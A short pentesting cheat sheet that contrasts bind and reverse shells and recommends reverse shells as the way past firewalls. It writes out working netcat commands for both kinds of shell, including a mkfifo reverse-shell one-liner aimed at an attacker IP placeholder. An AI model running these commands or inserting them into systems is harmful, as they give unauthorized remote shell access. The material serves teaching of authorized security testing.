# 🔐 Bind Shell vs Reverse Shell

## 🧠 Core Difference

|Type|Who initiates connection?|Direction|
|---|---|---|
|**Bind Shell**|Attacker connects to target|Attacker ➝ Target|
|**Reverse Shell**|Target connects back|Target ➝ Attacker|

---

# 🔗 1. Bind Shell

## 📌 Concept

The **target machine opens a port** and waits for the attacker to connect.

👉 Target = server  
👉 Attacker = client

---

## ⚙️ Example Using Netcat

### 🖥️ On Target Machine:

nc -lvnp 4444 -e /bin/bash

- Opens port **4444**
- Waits for incoming connection

---

### 🖥️ On Attacker Machine:

nc <target_ip> 4444

👉 Attacker connects and gets shell

---

## ⚠️ Problem with Bind Shell

- ❌ Blocked by firewalls (incoming connections)
- ❌ Target must expose a port

---

# 🔁 2. Reverse Shell

## 📌 Concept

The **target connects back to the attacker’s machine**

👉 Attacker = server (listener)  
👉 Target = client

---

## ⚙️ Example Using Netcat

### 🖥️ On Attacker Machine:

nc -lvnp 4444

---

### 🖥️ On Target Machine:

nc <attacker_ip> 4444 -e /bin/bash

👉 Target connects back → attacker gets shell

---

## ✅ Why Reverse Shell is Preferred

- ✔ Bypasses firewall (outbound allowed)
- ✔ More reliable in real-world scenarios
- ✔ Works behind NAT

---

# 🎯 Visual Understanding

## 🔗 Bind Shell

Attacker  ───────►  Target (listening)

## 🔁 Reverse Shell

Attacker (listening) ◄─────── Target

---

# 🧠 Real Pentesting Insight

|Scenario|Use|
|---|---|
|Open port available|Bind shell|
|Firewall/NAT present|Reverse shell ✅|

👉 In real-world pentesting:

> 🔥 **Reverse shells are used 90% of the time**

---

# ⚠️ Important Notes

- Some systems disable `-e` in Netcat
- Use alternatives if needed
- Always ensure **authorized testing only**

---

# 💡 Pro Tip

If `-e` is not available:

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

---

# 🚀 Summary

|Feature|Bind Shell|Reverse Shell|
|---|---|---|
|Connection|Attacker → Target|Target → Attacker|
|Firewall Friendly|❌ No|✅ Yes|
|Usage|Less common|🔥 Most common|
